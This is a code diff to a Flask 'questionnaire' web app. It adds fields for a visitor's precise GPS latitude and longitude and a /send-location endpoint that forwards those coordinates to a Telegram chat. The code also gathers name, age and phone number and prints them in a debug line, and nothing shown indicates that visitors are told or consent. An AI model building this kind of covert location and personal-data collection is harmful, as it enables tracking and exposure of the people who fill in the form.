@@ -1,4 +1,4 @@
-from flask import Flask, render_template, request, redirect, url_for
+from flask import Flask, render_template, request, redirect, url_for, jsonify
 import requests
 import os
 from datetime import datetime  # Import datetime for time calculations
@@ -32,8 +32,12 @@ def questionnaire():
         name = request.form.get('name')
         age = request.form.get('age')
         phonenumber = request.form.get('phonenumber')
-        location = request.form.get('location')
+        latitude = request.form.get('latitude')
+        longitude = request.form.get('longitude')
         color = request.form.get('color')
+        
+        # Create a location string
+        location = f"Latitude: {latitude}, Longitude: {longitude}"
         
         print(f"Received data: Name: {name}, Age: {age}, Phonenumber: {phonenumber}, Location: {location}, Color: {color}")  # Debugging line
         
@@ -43,6 +47,19 @@ def questionnaire():
         return redirect(url_for('thank_you', name=name, color=color, age=age))  # Redirect to thank you page
 
     return render_template('web_page.html')
+
+# Route to handle location data
+@app.route('/send-location', methods=['POST'])
+def send_location():
+    data = request.get_json()
+    latitude = data.get('latitude')
+    longitude = data.get('longitude')
+
+    # Send location to Telegram
+    location_message = f"User 's Location:\nLatitude: {latitude}\nLongitude: {longitude}"
+    send_to_telegram("Location Update", "", "", location_message, "")
+    
+    return jsonify({"status": "success", "message": "Location sent successfully!"})
 
 # Thank you route
 @app.route('/thank-you')
